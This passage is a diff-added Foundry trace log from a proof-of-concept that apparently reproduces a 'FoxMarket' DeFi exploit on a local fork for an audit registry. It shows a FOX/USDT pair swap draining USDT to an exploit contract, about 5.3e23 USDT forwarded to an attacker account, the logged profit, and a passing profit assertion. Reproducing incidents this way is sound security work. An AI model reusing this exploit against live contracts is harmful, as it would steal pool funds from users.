+    │   │   ├─ [38355] FOX/USDT pair::swap(450530941023056701789655683 [4.505e26], 0, FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
+    │   │   │   ├─ [23171] USDT::transfer(FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 450530941023056701789655683 [4.505e26])
+    │   │   │   │   ├─ emit Transfer(from: FOX/USDT pair: [0xAAb18bCDEe287AEA288c0560612cAadf7c328803], to: FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 450530941023056701789655683 [4.505e26])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0 → 0x00000000000000000000000000000000000000000174aba3405f79acebb15283
+    │   │   │   │   │   @ 0x37025e3330194ee0e03a21efa8d3e355639248adadb8caddb0ff8143c3b7d13f: 0x00000000000000000000000000000000000000000176895009ed4e6f46d946f5 → 0x00000000000000000000000000000000000000000001ddacc98dd4c25b27f472
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [531] USDT::balanceOf(FOX/USDT pair: [0xAAb18bCDEe287AEA288c0560612cAadf7c328803]) [staticcall]
+    │   │   │   │   └─ ← [Return] 2255756175807803367617650 [2.255e24]
+    │   │   │   ├─ [625] FOX::balanceOf(FOX/USDT pair: [0xAAb18bCDEe287AEA288c0560612cAadf7c328803]) [staticcall]
+    │   │   │   │   └─ ← [Return] 2433334966727689577370000 [2.433e24]
+    │   │   │   ├─ emit Sync(reserve0: 2255756175807803367617650 [2.255e24], reserve1: 2433334966727689577370000 [2.433e24])
+    │   │   │   ├─ emit Swap(sender: Pancake router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 2421242394040220430591507 [2.421e24], amount0Out: 450530941023056701789655683 [4.505e26], amount1Out: 0, to: FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 8: 0x6a80f72b00000000028f8a28660ea53fab7d00000176895009ed4e6f46d946f5 → 0x6a80f72b0000000203475a5565a366e3119000000001ddacc98dd4c25b27f472
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [531] USDT::balanceOf(FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   └─ ← [Return] 450530941023056701789655683 [4.505e26]
+    │   │   └─ ← [Stop]
+    │   ├─ [531] USDT::balanceOf(FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 450530941023056701789655683 [4.505e26]
+    │   ├─ [6071] USDT::transfer(Attacker EOA: [0x5670d36f00bc7F6860B6AfdDb288E3668efc0ef9], 530941023056701789655683 [5.309e23])
+    │   │   ├─ emit Transfer(from: FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: Attacker EOA: [0x5670d36f00bc7F6860B6AfdDb288E3668efc0ef9], amount: 530941023056701789655683 [5.309e23])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xd10da828a2c002b2503bc47368dfed8518e2a8d5f7c7b196c32c8f20ede29f94: 0x00000000000000000000000000000000000000000000000fa39c6cc347b75154 → 0x00000000000000000000000000000000000000000000707e0277acbb3168a3d7
+    │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0x00000000000000000000000000000000000000000174aba3405f79acebb15283 → 0x000000000000000000000000000000000000000001743b34e18439b502000000
+    │   │   └─ ← [Return] true
+    │   └─ ← [Stop]
+    ├─ [531] USDT::balanceOf(Attacker EOA: [0x5670d36f00bc7F6860B6AfdDb288E3668efc0ef9]) [staticcall]
+    │   └─ ← [Return] 531229513635317959664599 [5.312e23]
+    ├─ emit log_named_decimal_uint(key: "USDT profit", val: 530941023056701789655683 [5.309e23], decimals: 18)
+    ├─ [3081] USDT::symbol() [staticcall]
+    │   └─ ← [Return] "USDT"
+    ├─ [531] USDT::balanceOf(Attacker EOA: [0x5670d36f00bc7F6860B6AfdDb288E3668efc0ef9]) [staticcall]
+    │   └─ ← [Return] 531229513635317959664599 [5.312e23]
+    ├─ [2425] USDT::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker Final USDT Balance", val: 531229513635317959664599 [5.312e23], decimals: 18)
+    ├─ [0] VM::assertGt(530941023056701789655683 [5.309e23], 100000000000000000000000 [1e23], "USDT profit") [staticcall]
+    │   └─ ← [Return]
+    ├─  storage changes:
+    │   @ 0x0cc037b3dd2910b315b294c224bfa94d0e0a5cae1031b7388b45b00595c58a97: 0 → 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a
+    │   @ 0x0cc037b3dd2910b315b294c224bfa94d0e0a5cae1031b7388b45b00595c58a9a: 0 → 1
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 24.93ms (17.31ms CPU time)
+
+Ran 1 test suite in 706.38ms (24.93ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+/workspaces/RustroverProjects/audits/evm-hack-registry/_shared/run-poc/run_poc.sh: line 71: 83524 Killed                  nice -n 10 anvil --load-state "$TMPROOT/anvil_state.json" --port 0 --chain-id "$CHAINID" > "$ANVIL_LOG" 2>&1  (wd: /workspaces/RustroverProjects/audits/evm-hack-registry/2026-08-FoxMarket_exp)
